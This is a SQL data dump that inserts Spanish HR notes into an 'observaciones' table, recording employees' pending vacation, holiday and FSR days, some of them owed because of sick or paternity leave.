INSERT INTO `observaciones` VALUES (8,291,'Vacaciones pendientes de disfrutar 2018 por baja: 16 dГӯas vacaciones, 5 Festivos y 1 FSR.\r\n*DГӯa 20/5/2019 devoluciГіn 1 FSR del 2018.\r\n*Del 8 al 14 de Julio devoluciГіn 7 dГӯas de vacaciones.\r\n*Del 26/08 al 1/09 de Julio devoluciГіn 7 dГӯas de vacaciones.\r\n','2019-05-08 11:03:32','2019-06-26 12:17:39'),(13,73,'Pendientes:\r\n 7 VAC 2019\r\n4 FSR 2019\r\n15 FES 2020 (27/04 al 10/05)','2019-11-14 14:03:34','2020-04-27 07:43:14'),(16,191,'Pendientes por IT: \r\n2019  1 FSR','2019-12-26 16:28:17','2020-03-24 19:03:46'),(19,178,'pendientes 2 vac de 2019','2020-01-27 10:35:34','2020-01-27 10:35:34'),(21,363,'PENDIENTE 1 VAC','2020-01-27 10:38:52','2020-01-27 10:38:52'),(22,370,'PENDIENTE 1 FSR 2019','2020-01-27 10:39:23','2020-01-27 10:39:23'),(23,394,'PENDIENTES 2 FES 2019','2020-01-27 10:40:54','2020-01-27 10:40:54'),(24,225,'pendiente 1 turno de vacaciones de 2020','2020-02-06 07:37:37','2020-02-06 07:37:37'),(27,356,'8 dГӯas de vacaciones pendientes por baja enfermedad','2020-04-17 05:25:35','2020-04-17 05:25:35'),(29,423,'Se le deben 14 Vac que le coinciden con la paternidad 28/02 al 13/03','2022-01-21 11:50:21','2022-01-21 11:50:21'),(30,89,'Se le deben 3 semanas de vacaciones (28/02 al 20/03)','2022-02-09 07:02:58','2022-02-09 07:02:58'),(31,181,'14 y 15/02 se le deben de vac por negociaciГіn de convenio','2022-02-17 12:10:51','2022-02-17 12:10:51');
